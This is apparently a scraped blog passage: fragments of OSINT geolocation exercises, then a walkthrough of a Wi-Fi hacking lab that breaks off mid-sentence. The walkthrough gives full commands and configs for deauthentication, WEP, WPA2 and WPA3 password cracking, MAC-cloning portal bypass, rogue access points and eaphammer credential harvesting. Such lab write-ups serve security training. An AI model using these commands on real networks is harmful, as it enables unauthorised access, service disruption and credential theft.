fuel station and a junction where cars cross the train tracks and found the following location.\nFrom the image above we have been able to identify our location.\nAnswer: 40°05'50.9\u0026quot;N 67°48'11.7\u0026quot;E\nPhoto 4 # This photo too we shall first try and analyze it and see features we can use to locate our place, then perform a reverse image search.\nAfter identifying the features, we shall use this details to confirm our location.

I opted for what seemed to be the most reliable source, which estimated it at approximately 300 km.\nFinally, the distance from the Samarkand Train Station to the Siyob Hostel—which I assume is the person\u0026rsquo;s accommodation, given its closeness to the approximate viewpoint of the last photo—is:\n5.3km\nTherefore total is approximately distance covered is 312.7 km\n","date":"28 March 2025","externalUrl":null,"permalink":"/posts/osintexercise-26/","section":"Posts","summary":"credit to Sofia Santos","title":"OSINT(Exercise 26)","type":"posts"},{"content":" Exercise 25 # For this challenge, we are required to locate the building with the art on the image and find another quote on the same building with a quote containing the word anarchy as indicated in the task briefing.\nThe world is full of anonymous quotes.

Hence the distance covered was 5 miles(8.2 kilometers)\nAnswer: 5miles(8.2 kilometers)\nEstimate the average speed at which the Queen’s carriage travelled # From the page we found initially containing the routes the queen covered back to the palace also had details about the time she arrived at each spot as shown below. From this time table we can calculate the time taken to arrive at the palace by finding the difference between arrival and departure times using this online calculator as shown below. From the calculator we have found the time difference in different time formats from hours to seconds. Now to calculate the speed we can do it in two ways miles per hour or kilometers per hour that is dividing the distance covered by time taken (Speed=distance/time) using this online calculator as shown below. Speed in miles per hour is 3miless/hour as shown above.

What is the ESSID of the hidden AP (mac F0:9F:C2:6A:88:26)? # For this section, we shall use the mdk4 tool to perform a brute force to launch probes with each of the ESSID until the AP responds, however we shall need to modify our wordlist by embedding the word wifi- before the words as the other APs are named.\ncat ~/rockyou-top100000.txt | awk '{print \u0026quot;wifi-\u0026quot; $1}' \u0026gt; /home/user/VICTOR/captures/pass.txt\nFirst we shall capture the traffic using the command we used before in order for us to identify the channel to which the AP is on to use it to set for us to capture the traffic to perform a brute force attack on it to get the AP name using the commands shown below.\niwconfig wlan0mon channel \u0026lt;channel number\u0026gt; the iwconfig is used to display and change the parameters of the network interface which are specific to the wireless operation, in this case we are setting the channel to that of the hidden AP.\nAfterwards we shall then brute force the captured traffic using mdk4 as shown mdk4 wlan0mon p -t F0:9F:C2:6A:88:26 -f pass.txt.\nmdk4 :\nThe name of the tool being run. MDK4 is commonly used for Wi-Fi testing and comes with several testing modes.\nwlan0mon :\nThe network interface in monitor mode (important for injecting packets and performing wireless attacks). Replace wlan0mon with your interface name if it\u0026rsquo;s different.\np :\nThis specifies the Probe Request Flood mode in MDK4. This mode sends a flood of probe requests, which can simulate many devices searching for networks, potentially overloading the target AP or causing disruptions.\nt F0:9F:C2:6A:88:26 :\nThe t option specifies the target\u0026rsquo;s MAC address . In this case, the target MAC address is F0:9F:C2:6A:88:26.\nf pass.txt :\nThe f option provides a file containing SSIDs (network names) or other parameters to use during the attack.\nIn this case, the file pass.txt likely contains SSIDs that will be included in the probe requests to target the specific access point.\nOPN # 05. What is the flag in the hidden AP router behind default credentials? # After we got our ESSID, we shall now try to connect to the network using wpa_supplicant,(utility for managing wireless network connections in Linux) from the terminal after creating a config file that will enable us to connect to the wifi, the contents of the file will be as shown below.\nnetwork={ ssid=\u0026#34;$ESSID\u0026#34; key_mgmt=NONE scan_ssid=1 } The above details mean the following.\nnetwork={} :\nThis block defines a specific Wi-Fi network configuration. ssid=\u0026quot;$ESSID\u0026quot; :\nssid specifies the name of the Wi-Fi network to connect to. If you use $ESSID, it implies that $ESSID is a variable (e.g., set in your environment or script). Note : wpa_supplicant does not directly interpret variables in the configuration file. You would need to preprocess the file or replace $ESSID with the actual network name (e.g., ssid=\u0026quot;MyNetwork\u0026quot;). key_mgmt=NONE :\nkey_mgmt=NONE specifies that no key management is required for this network. This typically indicates an open network (e.g., one without WPA/WPA2 encryption). scan_ssid=1 :\nscan_ssid=1 tells wpa_supplicant to actively scan for the specified SSID. This is useful for hidden networks (networks that don\u0026rsquo;t broadcast their SSID). after we have created our file, we shall now try to connect to our wifi using wpa_supplicant using the syntax wpa_supplicant -Dnl80211 -iwlan2 -c free.conf and on another terminal we shall try to get an IP address from the connected wifi network using the dhclient using the command dhclient wlan2 -v as root user .\nThe command wpa_supplicant -Dnl80211 -iwlan2 -c free.conf means as follows\nwpa_supplicant : This is the command-line tool for connecting to Wi-Fi networks. It\u0026rsquo;s used to handle the WPA/WPA2 authentication process. Dnl80211 : The D option specifies the driver back-end to be used. nl80211 is the modern driver interface for communicating with kernel-based Wi-Fi drivers, typically used in most Linux distributions. Other options might include wext (deprecated) or hardware-specific back-ends. iwlan2 : The i option specifies the interface name of the Wi-Fi network card you want to connect with. In this case, the interface is wlan2. Replace this with your actual wireless interface (e.g., wlan0 or wlan1) if necessary. c free.conf : The c option specifies the configuration file to use. free.conf is the configuration file that contains the necessary details for connecting to the desired wireless network. This file typically includes: The SSID (network name). The security protocols (e.g., WPA2, PSK). The pre-shared key or passphrase for the network. The command dhclient wlan2 -v means\ndhclient : This is the DHCP client program on Linux systems. It requests network configuration parameters (like an IP address, subnet mask, gateway, DNS servers) from a DHCP server on the network. wlan2 : The name of the network interface for which the DHCP request is being made. In this case, it is the wlan2 interface (likely a wireless network adapter). v : Enables verbose mode , which provides detailed output about the process, such as: Sending the DHCP request. Responses received from the DHCP server. Lease details (e.g., assigned IP, lease time, etc.). Any errors encountered during the process. The image above shows the wpa_supplicant running.\nHere we have received an IP address from the network as 192.168.16.84\nOnce connected to the wifi network we can access the web portal from 192.168.16.1 and try to login as an admin user using some default credentials as admin/admin as most people tend to leave their default creds as they are.\nAfter logging in using the creds we found, we now have our flag.\n06. What is the flag on the AP router of the wifi-guest network? # For this challenge we shall begin by scanning the wifi-guest using airodump-ng as we did in the first challenge of recon in order to identify the channel on to which it is running on then try to access the admin page as we did in the previous task.\nIt is running on channel 6, we can now try and capture traffic going through channel 6 alone then create a .conf file that will allow us to connect to the wifi network, the config file will contain the name of the ESSID of the wifi and set key_mgmt=NONE as shown below.\nnetwork={ ssid=\u0026#34;wifi-guest\u0026#34; key_mgmt=NONE } As seen below we have successfully acquired an IP address from the wifi network and we are able to access the web page but it seems we have a captive portal that we are required to bypass.\nFor us to bypass this portal, we will have to clone one of the MAC addresses connected to the wifi as shown below we have one.\nB0:72:BF:44:B0:49\nwe shall first stop the network manager then set the wlan2 interface down then change to the mac address we saw earlier using the commands below and retry again to connect to the wifi network as earlier.\nsystemctl stop network-manager ip link set wlan2 down macchanger -m b0:72:bf:44:b0:49 wlan2 ip link set wlan2 up we have now bypassed the portal as shown below.\nI tried some default creds but they did not work, however, I decided to capture traffic using airodump-ng on the channel and go through it to see f there are any credentials that I can find on the capture file.\nas shown above after capturing our traffic using the command airodump-ng wlan0mon --manufacturer --wps -c6 -w /home/user/VICTOR/captures/OPN/ we can now go through our traffic and be able to get the password by going through the traffic using wireshark then get our credentials for logging in to the web page as admin.\nand we have our flag.\nWEP # 07. What is the flag on the wifi-old AP website? # This challenge was quite easy as we can get the cahnnel and BSSID of the wifi using airodump-ng and try get the key using besside-ng as shown below.\nThen we can use besside-ng to get the key, as this tool does the heavy work automatically and gets the password for us, we shall use the syntax besside-ng -c 3 -b F0:9F:C2:71:22:11 wlan2 -v .\nbesside-ng : The main tool being run. It automates the process of: Scanning for networks. Associating with access points. Capturing WPA/WPA2 handshakes. Cracking WEP-encrypted networks. c 3 : The c option specifies the Wi-Fi channel to focus on. In this case, it restricts the tool to operate on channel 3 , rather than scanning all available channels. b F0:9F:C2:71:22:11 : The b option specifies the MAC address of the target access point (AP) . This ensures that besside-ng only targets the specific AP with MAC address F0:9F:C2:71:22:11. wlan2 : The wireless interface to be used for the attack. This interface must support monitor mode and packet injection. Ensure wlan2 is already in monitor mode (e.g., using airmon-ng start wlan2). v : Enables verbose mode , which provides detailed output during execution. Useful for monitoring the tool’s progress and troubleshooting any issues. We now have the key as shown below for the wifi network.\nNow as WEP has a weaker security for wifi, we can use the key to create a .conf file as the intial challenge and connect to the network using wpa_supplicant and get our IP address using dhclient on another terminal as we run it as root user, the contents of the .conf file shall be.\nnetwork={ ssid=\u0026#34;wifi-old\u0026#34; key_mgmt=NONE wep_key0=$PASSWORD wep_tx_keyidx=0 } The contents of the file mean as explained below.\nnetwork={} : Defines a specific Wi-Fi network to connect to. Each network block contains settings for a single network. ssid=\u0026quot;wifi-old\u0026quot; : Specifies the SSID (network name) of the Wi-Fi network you want to connect to. In this case, the network name is wifi-old . key_mgmt=NONE : Specifies the key management protocol . NONE indicates there is no WPA or WPA2 encryption . This is common for WEP networks or open networks. Instead of WPA or WPA2, the network uses the outdated WEP encryption . wep_key0=$PASSWORD : Defines the WEP key (password) for the network. The key is expected to be supplied in this placeholder $PASSWORD. However: wpa_supplicant does not resolve variables directly in the configuration file, so you need to replace $PASSWORD with the actual WEP key (e.g., wep_key0=12345). The key can be specified as: A hexadecimal string (e.g., wep_key0=6162636465). A quoted ASCII string (e.g., wep_key0=\u0026quot;abcde\u0026quot;). wep_tx_keyidx=0 : Specifies which WEP key index to use for transmission. WEP supports multiple keys (up to 4, indexed from 0 to 3). wep_tx_keyidx=0 means the first key (wep_key0) will be used for encrypting outgoing packets. as seen above we have successfully connected to the wifi network and now we can try and access the webpage at 192.168.1.1\nwe have our flag now.\nPSK # 08. What is the wifi-mobile AP password? # This challenge we have to find the password for the PSK wifi network, here we shall monitor the traffic using airodump-ng and wait for a client to connect or to force a deauth attack with aireplay-ng but first we have to identify the channel of the wifi network.\nIt is channel 6, we can now capture traffic on the channel as we perform a deauth attack on another terminal using aireplay-ng to get a handshake that we can use to get the password for the wifi.\nThe commands we shall use in parallel are as follows.\naireplay-ng -0 10 -a F0:9F:C2:71:22:12 wlan0mon\naireplay-ng :\nThis is the tool being executed. It is used to inject packets into a wireless network for various purposes (e.g., deauthentication, fake authentication, ARP request replay). 0 :\nSpecifies a deauthentication attack mode . The tool sends deauthentication packets to disconnect clients from the target network. 10 :\nIndicates the number of deauthentication packets to send. In this case, 10 deauthentication packets will be sent. You can specify 0 to send packets continuously until manually stopped. a F0:9F:C2:71:22:12 :\nSpecifies the MAC address of the target access point (AP) . In this case, the deauthentication packets will be directed at the AP with MAC address F0:9F:C2:71:22:10 . wlan0mon :\nSpecifies the wireless interface in monitor mode . The interface (wlan0mon) must be in monitor mode, which is required to send raw packets. Use airmon-ng start wlan0 to enable monitor mode before running this command airodump-ng wlan0mon -w ~/wifi/scanc6 -c 6 --wps\nas seen above we have performed a deauth attack(an EAPOL traffic indicates that we have captured a successful handshake from the wifi network) using aireplay-ng and we wait a little longer for the airodump-ng to capture some traffic that we can use aircrack-ng to try and get the password using the wordlist top100000.txt.\naircrack-ng -w rockyou-top100000.txt -- '-01.cap'\nwe have our key.\n09. What is the IP of the web server in the wifi-mobile network? # For this challenge we shall use airdecap-ng to decipher our traffic we captured earleir as we now have the key to decipher our traffic then open the deciphered file using wireshark to get the IP of the webserver.\nThe command we shall use to decipher our traffic is as follows.\nairdecap-ng -e wifi-mobile -p $PASSWORD -- '-01.cap'\nairdecap-ng : The tool decrypts WEP, WPA, or WPA2-encrypted packet captures (.cap files) based on the network\u0026rsquo;s encryption key or passphrase. e wifi-mobile : Specifies the ESSID (network name) of the target Wi-Fi network. In this case, the ESSID is wifi-mobile. It helps the tool identify which network\u0026rsquo;s packets to decrypt, especially when multiple networks are present in the capture file. p $PASSWORD : p specifies the password (or passphrase) of the target Wi-Fi network. $PASSWORD is a placeholder variable that stores the actual Wi-Fi passphrase. If the variable contains the correct passphrase, airdecap-ng will use it to decrypt the encrypted packets in the capture file. - : The - signals the end of options. Anything after - is treated as an argument (like file names), even if it starts with a ``. '-01.cap' : The name of the capture file that contains the encrypted packets to decrypt. The file name 01.cap starts with a dash (``), which can confuse tools into interpreting it as a flag. Using - or prefixing the file name with ./ ensures it\u0026rsquo;s treated as a file. we can now open the deciphered traffic and get the IP of the webserver.\nwe have our webserver IP as shown below\n10. what is the flag after login in wifi-mobile? # As seen from the hint given, we are required to use cookies.\nGoing through the decrypted traffic, we saw a cookie from the GET request sent to the web server that we can use to gain the user flag from the website.\nWe shall use wpa_supplicant and dhclient as we did earlier in order to be able to log in to the website.\nThe contents of our configure file shall be as follows.\nnetwork={ ssid=\u0026#34;wifi-mobile\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; scan_ssid=1 key_mgmt=WPA-PSK proto=WPA2 }PHPSESSID=97qfe2c37hso8725c1p5reft7s network={ ... } : Defines a network block, which contains all the settings required to connect to a specific Wi-Fi network. ssid=\u0026quot;wifi-mobile\u0026quot; : Specifies the SSID (Service Set Identifier) of the Wi-Fi network. In this case, the SSID is wifi-mobile. psk=\u0026quot;$PASSWORD\u0026quot; : Specifies the pre-shared key (PSK) , which is the password for the Wi-Fi network. $PASSWORD is a placeholder variable. Replace it with the actual passphrase (e.g., psk=\u0026quot;mypassword123\u0026quot;). The PSK is used for WPA/WPA2-Personal authentication. scan_ssid=1 : Tells the device to actively scan for the network , even if the SSID is hidden. If the access point does not broadcast its SSID, setting this to 1 enables the client to detect and connect to it. key_mgmt=WPA-PSK : Specifies the key management protocol used by the network. WPA-PSK indicates WPA/WPA2 with a Pre-Shared Key (PSK) for authentication. proto=WPA2 : Specifies the protocol to be used for encryption and authentication. WPA2 is used here, which is a secure protocol based on AES encryption. You could also specify WPA for legacy networks. As shown below, we have successfully been given an IP to the network we can try to access the webpage and edit the cookie to get the flag.\nwe have our flag as shown below.\n11. Is there client isolation in the wifi-mobile network? # For this challenge we shall use arp-scan to scan the network for more hosts though the interface we have connected to the network using the commmand sudo arp-scan -I wlan2 -l\narp-scan :\narp-scan is a tool used to identify all active devices on a local network by sending ARP (Address Resolution Protocol) requests. It works at the data link layer (Layer 2), making it highly effective for discovering devices on the same subnet. I wlan2 :\nI specifies the network interface to use for the scan. In this case, wlan2 is the wireless interface you want to scan with. l :\nl (lowercase \u0026ldquo;L\u0026rdquo;) tells arp-scan to scan the local subnet (determined by the interface\u0026rsquo;s IP address and subnet mask). For example, if the interface wlan2 is on 192.168.1.0/24, it will scan all IPs in that range (from 192.168.1.1 to 192.168.1.254). After scanning the network we fingd the following clients on the network.\nuser@WiFiChallengeLab:~/VICTOR/captures/psk$ sudo arp-scan -I wlan2 -l Interface: wlan2, type: EN10MB, MAC: 02:00:00:00:02:00, IPv4: 192.168.2.84 Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan) 192.168.2.1\tf0:9f:c2:71:22:12\tUbiquiti Networks Inc. 192.168.2.7\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.7\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 192.168.2.8\t28:6c:07:6f:f9:43\tXIAOMI Electronics,CO.,LTD 192.168.2.8\t28:6c:07:6f:f9:44\tXIAOMI Electronics,CO.,LTD (DUP: 2) 5 packets received by filter, 0 packets dropped by kernel Ending arp-scan 1.9.7: 256 hosts scanned in 2.225 seconds (115.06 hosts/sec). 5 responded we can try and curl one of the host and see if we can get the flag.\nby curling the host 192.168.2.8 we get the user flag.\n12. What is the wifi-offices password? # For this challenge, imagine you’re trying to connect to a Wi-Fi network called \u0026ldquo;wifi-offices,\u0026rdquo; but it doesn’t show up in the list of available networks. This could mean the network is in a different location or no longer exists. However, there’s still a way to figure out its password. Here’s how:\nWe can create a fake access point (AP) that imitates \u0026ldquo;wifi-offices\u0026rdquo; using a tool like hostapd-mana. When devices nearby try to connect to this fake AP (because they’re still looking for \u0026ldquo;wifi-offices\u0026rdquo;), we can capture their connection attempts, also known as probes. From these, we can capture a handshake, which is like a key exchange between the device and the network. Once we have this handshake, we can run a dictionary attack on it to try and crack the password and see it in plain text.\nThe contents of our config file shall contain the following details.\ninterface=wlan1 driver=nl80211 hw_mode=g channel=1 ssid=wifi-offices mana_wpaout=hostapd.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 The above file contents means the following\ninterface=wlan1 Specifies the wireless interface to be used for hosting the access point. In this case, the interface is wlan1 . This must be a wireless adapter that supports monitor and AP modes. driver=nl80211 Indicates the driver to be used by hostapd. nl80211 is the standard driver interface used for modern Wi-Fi adapters with Linux. hw_mode=g Defines the Wi-Fi mode for the access point: g : Operates on the 2.4 GHz band, supporting 802.11g (and backward-compatible 802.11b) devices. Other options could include a (5 GHz) or n (802.11n for mixed bands). channel=1 Specifies the Wi-Fi channel to use for the access point. Channel 1 operates on the 2.4 GHz frequency band. The channel you choose can affect performance and interference. ssid=wifi-offices Sets the SSID (Service Set Identifier) for the fake access point. The AP will broadcast itself with the name wifi-offices , imitating a real network. mana_wpaout=hostapd.hccapx Configures the output file for captured WPA/WPA2 handshakes . The captured handshake data will be saved to the file hostapd.hccapx , which can later be used for password cracking (e.g., with tools like Hashcat). wpa=2 Specifies the WPA protocol version to be used: 2 : Configures WPA2 (more secure and commonly used). 1 : Would configure WPA (less secure and outdated). wpa_key_mgmt=WPA-PSK Defines the key management protocol : WPA-PSK : Stands for WPA Pre-Shared Key , the standard for personal Wi-Fi networks where a single password is shared among users. wpa_pairwise=TKIP CCMP Specifies the encryption protocols to be used for securing data: TKIP : Temporal Key Integrity Protocol (older and less secure, for backward compatibility). CCMP : Counter Mode Cipher Block Chaining Message Authentication Code Protocol (stronger encryption based on AES). wpa_passphrase=12345678 Sets the Wi-Fi password (passphrase) for the rogue access point. The password for this network is 12345678 . After writing the file and running it with hostapd-mana we get some hashes that we can crack using hashcat as shown below.\ntrying to crack the hash using mode 2500 it does not work, we can try to change it to mode 2200 and try again\nAfter some research, I found out the hash was supposed to be separated from other unwanted characters using the following syntax.\ncat hostapd.hccapx | awk {\u0026#39;print $3\u0026#39;} \u0026gt; hostapd.22000 Breakdown:\ncat hostapd.hccapx Reads (concatenates) the contents of the file hostapd.hccapx and outputs it. | (Pipe) Passes the output of cat as input to the next command. awk {'print $3'} Uses awk, a text processing tool, to extract the third column ($3) from each line. \u0026gt; hostapd.22000 Redirects the output to a new file named hostapd.22000. We now have our password for the wifi as shown below.\nthe password was easily found by using the syntax below with hashcat hashcat -a 0 -m 22000 hostapd.22000 ~/rockyou-top100000.txt --force\nSAE # 13. What is the flag on the wifi-management AP website? # Even in WPA3 networks, it’s still possible to attempt a brute-force attack to discover the password. A tool called \u0026ldquo;wacker\u0026rdquo; can be used for this purpose. It allows us to repeatedly test different password combinations against the network until the correct one is found.\nHowever, keep in mind that WPA3 includes features like SAE (Simultaneous Authentication of Equals), which makes brute-forcing much more challenging by limiting the speed of attempts and using modern cryptographic techniques. Tools like wacker exploit specific vulnerabilities or rely on scenarios where the WPA3 implementation might not be as secure as intended.\nFirst we will have to get the wifi network bssid number and frequency that we can use together with wacker to get the wifi password then use wpa_supplicant to be able to access the website to get the flag.\nwe now have the BSSID number F0:9F:C2:11:0A:24 we can now use the BSSID to get the password using wacker with the syntax ./wacker.py --wordlist ~/rockyou-top100000.txt --ssid wifi-management --bssid F0:9F:C2:11:0A:24 --interface wlan2 --freq 2462\nhere is the breakdown of the command\n./wacker.py This runs the Python script wacker.py, which is likely a custom or specialized tool for Wi-Fi brute-forcing or attack tasks. -wordlist ~/rockyou-top100000.txt Specifies the path to the wordlist containing potential passwords to test. In this case, it uses rockyou-top100000.txt, a popular subset of the rockyou.txt password dictionary file, which contains 100,000 commonly used passwords. -ssid wifi-management Indicates the target SSID (Wi-Fi network name) you are attacking. Here, the network is called wifi-management. -bssid F0:9F:C2:11:0A:24 Specifies the target’s BSSID, which is the unique MAC address of the access point. This ensures the attack focuses on the correct network, even if there are other networks with similar SSIDs nearby. -interface wlan2 Defines the wireless interface (network adapter) that will be used for the attack. In this example, the wireless adapter is wlan2. -freq 2462 Specifies the frequency of the Wi-Fi channel in MHz. 2462 MHz corresponds to channel 11 in the 2.4 GHz band. The tool will tune into this frequency to communicate with the target network. we have our password, we can use it now to create a config file that we can use with wpa_supplicant, the following is the content of the file\nnetwork={ ssid=\u0026#34;wifi-management\u0026#34; psk=\u0026#34;$PASSWORD\u0026#34; key_mgmt=SAE scan_ssid=1 ieee80211w=2 } the file content means as follows\nnetwork={...} This block defines the configuration for a specific Wi-Fi network. Multiple network blocks can exist in a configuration file to manage multiple networks. ssid=\u0026quot;wifi-management\u0026quot; Specifies the SSID (Service Set Identifier) of the Wi-Fi network to connect to. Here, the network name is wifi-management. psk=\u0026quot;$PASSWORD\u0026quot; Indicates the pre-shared key (Wi-Fi password) required to connect to the network. The $PASSWORD placeholder would typically be replaced with the actual password in plaintext or a hashed version (depending on your tool). key_mgmt=SAE Specifies the key management protocol to use for authentication. SAE (Simultaneous Authentication of Equals) is the protocol used in WPA3-Personal networks. It enhances security by preventing offline dictionary attacks and improving password-based authentication. scan_ssid=1 Enables scanning for hidden networks . A hidden SSID will not broadcast its name, so enabling scan_ssid=1 allows the client to actively probe for the specified SSID. ieee80211w=2 Configures Management Frame Protection (MFP) . Values : 0: Disabled (not recommended). 1: Optional. 2: Required (mandatory for WPA3). ieee80211w=2 ensures that MFP is enforced, providing additional protection against deauthentication attacks, which is required for WPA3 networks. We can now access the AP website at 192.168.14.1 as seen below and get our flag.\n14. What is the flag on the wifi-IT AP website? # When dealing with a network using WPA3-SAE, it’s possible to exploit a weakness if a client is configured to support both WPA2 and WPA3. Here’s how it works: we can trick the client into downgrading its connection to WPA2 by setting up a Rogue Access Point (RogueAP). Once the client connects to our RogueAP, we can capture the WPA2 handshake and later try to crack it.\nTake the example of the wifi-offices network. In this scenario, the access point (AP) supports both SAE (used in WPA3) and PSK (used in WPA2). This suggests that some clients might still accept PSK connections. To confirm this, we can analyze the data captured by tools like airodump-ng , specifically looking at the .csv file it generates. This file provides details about the authentication methods supported by the AP and its clients, helping us determine whether the downgrade attack is feasible.\nWe shall start by identifying the BSSID of the wifi using airodump-ng that we can use later .\nwe have the BSSID as F0:9F:C2:1A:CA:25 ,we can now create a rogue AP but first we shall create our config file with the following contents\ninterface=wlan1 driver=nl80211 hw_mode=g channel=11 ssid=wifi-IT mana_wpaout=hostapd-management.hccapx wpa=2 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP CCMP wpa_passphrase=12345678 interface=wlan1\nSpecifies the wireless network interface to be used for the access point. Here, it’s wlan1 .\ndriver=nl80211\nSets the driver for the wireless card. nl80211 is the standard Linux driver used for most modern Wi-Fi devices.\nhw_mode=g\nSpecifies the wireless mode. g indicates that the AP will operate on the 2.4 GHz band , supporting 802.11g devices.\nchannel=11\nSpecifies the Wi-Fi channel on which the AP will operate. Channel 11 is a common choice for 2.4 GHz networks.\nssid=wifi-IT\nSets the SSID (Service Set Identifier) of the access point. This is the name of the network that devices will see when scanning for Wi-Fi. Here, the network is named wifi-IT .\nmana_wpaout=hostapd-management.hccapx\nConfigures mana-toolkit to save captured WPA handshake data to a file named hostapd-management.hccapx . This can be used for offline password cracking.\nwpa=2\nSpecifies the security protocol used for the network. 2 indicates WPA2, which is a secure Wi-Fi encryption standard.\nwpa_key_mgmt=WPA-PSK\nSets the key management method. WPA-PSK (Pre-Shared Key) means devices will use a shared password for authentication.\nwpa_pairwise=TKIP CCMP\nConfigures the encryption protocols:\nTKIP (Temporal Key Integrity Protocol): An older encryption method. CCMP (Counter Mode with Cipher Block Chaining Message Authentication Code Protocol): A more secure encryption method based on AES. Modern devices usually prefer CCMP . wpa_passphrase=12345678\nSets the pre-shared key (Wi-Fi password) for the network. In this example, the password is 12345678 . It must be between 8 and 63 characters long.\nBefore we set up our rogue AP lets check if the AP has MFP with wireshark as shown below.\nyou may be wondering why we had to check MFP, let me break it down to you. MFP (Management Frame Protection) is a wireless network feature designed to secure management frames from being tampered with or spoofed. When MFP is set to false (or disabled), the network becomes more vulnerable to certain types of wireless attacks.\nWhen MFP is False: Potential Vulnerabilities\nDeauthentication and Disassociation Attacks Attackers can send spoofed deauthentication or disassociation frames to disconnect clients from the network (e.g., using tools like aireplay-ng ). This is commonly used in Evil Twin attacks or to capture WPA handshakes for password cracking. Rogue Access Points and Evil Twin Attacks An attacker can set up a malicious AP that mimics the real one. Clients may be tricked into connecting to the rogue AP if MFP is not enforcing management frame integrity. Beacon Frame Spoofing Attackers can inject fake beacon frames to confuse clients, leading to denial-of-service (DoS) attacks or manipulation of the network. Channel Switching Attacks Attackers can send forged management frames to force clients to switch to a different channel, disrupting communication. Client Tracking Without MFP, management frames can be captured and analyzed to track connected devices\u0026rsquo; activity, leading to privacy issues. In our case with MFP disabled we can use this opportunity to create a rogue AP and perform a deauth attack in parallel in order to capture the password for the network when a client tries to log in to our rogue AP as shown below.\nWe can now crack the hashes to get the wifi password using hashcat. As we did in the challenge number 12 on PSK category.\nAfter we have our password we shall then create a config file that will allow us to login to the website to get the falg, for this section we can follow the previous challenge on how to use wpa_supplicant and dhclient to get an IP that we can use to access the wifi network for us to be able to access the website.\nRecon MGT # 15. What is the domain of the users of the wifi-regional network? # In management (MGT) networks, it\u0026rsquo;s possible for misconfigured users to send their identity (username) in plain text before the secure TLS tunnel is established. This can expose sensitive information. Using a tool like airodump-ng , we can passively capture this data without actively interfering with the network.\nHere’s how it works:\nYou simply run airodump-ng on the correct channel of the network and patiently wait for clients to connect. As users attempt to authenticate, their identity information might be visible in the captured packets if the network or client devices are misconfigured. This is a good example of why properly securing WPA2/WPA3 Enterprise networks is so important.\nHowever, we shall start first by identifying the channel of the wifi we are to connect to as shown below.\nIt is on channel 44, we can now try and capture traffic on the channel as we wait for a client to connect to the network. After we capture the traffic, as from the hint, we can use wifi_db to get the captured data from ariodump-ng in an arranged format that we can access from the database\nas shown below.\nThe syntax used for dispalying the data in sqlite is as follows python3 wifi_db.py -d wifi.sqlite /home/user/VICTOR/captures/psk/MGT here is the explanation of the command\npython3 wifi_db.py\nThis indicates that you\u0026rsquo;re running a Python script named wifi_db.py using Python 3. The script likely processes Wi-Fi-related data and interacts with a database.\nd wifi.sqlite\nThe -d option specifies the database file to use.\nwifi.sqlite is an SQLite database file, which is a lightweight, file-based database. The script will likely insert, query, or analyze data within this database. /home/user/VICTOR/captures/psk/MGT\nThis is the directory containing input data (e.g., capture files) for the script to process.\nThe folder /home/user/VICTOR/captures/psk/MGT likely contains capture files related to PSK (Pre-Shared Key) or MGT (Management) Wi-Fi networks. These files might include .cap, .pcap, or other formats used for Wi-Fi packet captures. 16. What is the email address of the servers certificate? # When establishing a TLS tunnel between an MGT network and a client, the access point (AP) sends its certificate to the client in plain text. This means that anyone monitoring the communication can see the certificate. While this might seem harmless, it can actually provide valuable information. For example, an attacker could use this certificate to create a fake version with the same fields, which can be used in a RogueAP attack. Additionally, the certificate might reveal details like the corporate domain, internal email addresses, or other relevant information about the AP or the organization.\nTo explore these certificates, we can use a tool like pcapFilter.sh, which helps display the certificates used by APs operating with MGT.\nThe syntax to run the script is as follows bash pcapFilter.sh -f '-02.cap' -C here is a breakdown of the command\npcapFilter.sh\nThis is the script being executed. It is a custom or third-party tool designed to process .cap files (packet captures) and filter specific information, such as certificates.\nf '-02.cap'\nThe f option specifies the input file for the script. -02.cap is the packet capture file containing network traffic data. C\nThis option tells the script to filter and display certificates. Certificates are often sent during the handshake process of networks using MGT or enterprise-level WPA protocols (e.g., WPA2-Enterprise). This data can provide insights into APs\u0026rsquo; configurations or help in crafting attacks like RogueAP or MITM.\n17. What is the EAP method supported by the wifi-global AP? # When testing the security of a network using EAP (Extensible Authentication Protocol), it\u0026rsquo;s important to understand what authentication methods the network\u0026rsquo;s AP (Access Point) supports. Once you\u0026rsquo;ve identified a valid user, you can probe the network by forcing different EAP authentication methods. This is where a tool like EAP_buster becomes valuable.\nbash ./EAP_buster.sh wifi-global 'GLOBAL\\GlobalAdmin' wlan\nbash ./EAP_buster.sh This runs a Bash script named EAP_buster.sh located in the current directory (./). The script is likely designed to test or exploit Extensible Authentication Protocol (EAP) configurations on Wi-Fi networks. wifi-global This is the SSID (Wi-Fi network name) of the target network. The script will perform its operations on this specific network. 'GLOBAL\\GlobalAdmin' This represents the identity or username being sent to the network during EAP authentication. The format DOMAIN\\User (e.g., GLOBAL\\GlobalAdmin) suggests the network is part of a corporate domain, and the user identity is tied to this domain. wlan1 This specifies the wireless interface to be used by the script. The interface wlan1 must be in monitor mode or capable of interacting with the target network. Below is how the output of the command looks like\nhowever, we could still identify the EAP method supported from hte database we got earlier\nMGT # 18. What is Juan\u0026rsquo;s flag on the wifi-corp AP website? # To target a misconfigured client on an MGT network, you can set up a Rogue Access Point (RogueAP) that mimics the legitimate network by using the same ESSID and configuration. This RogueAP should use a self-signed certificate, ideally replicating the details of the legitimate certificate to appear convincing if the client manually checks it. A tool like eaphammer can simplify this process.\npython3 ./eaphammer -i wlan3 --auth wpa-eap --essid wifi-corp --creds --negotiate balanced\npython3 ./eaphammer :\nThis runs the eaphammer script using Python 3. eaphammer is a tool designed to perform attacks on WPA-Enterprise networks, including setting up RogueAPs and credential harvesting.\ni wlan3 :\nSpecifies the wireless interface (wlan3) to be used for creating the RogueAP. Ensure this interface supports monitor mode and packet injection.\n-auth wpa-eap :\nIndicates the type of authentication used by the target network, in this case, WPA-Enterprise (WPA-EAP). This type of network uses protocols like PEAP or EAP-TLS for authentication.\n-essid wifi-corp :\nSets the ESSID (network name) for the RogueAP to wifi-corp, matching the name of the legitimate network. This is essential for deceiving clients into connecting to the RogueAP.\n-creds :\nEnables credential harvesting. The RogueAP will attempt to collect usernames and passwords or authentication tokens when a client connects and tries to authenticate.\n-negotiate balanced :\nThis sets the TLS negotiation strategy for the RogueAP to \u0026ldquo;balanced.\u0026rdquo; It aims to balance security and compatibility when negotiating the TLS handshake with clients. This approach helps to mimic a real access point more convincingly.\nUsing airodump-ng , we can identify the MAC addresses of the clients we 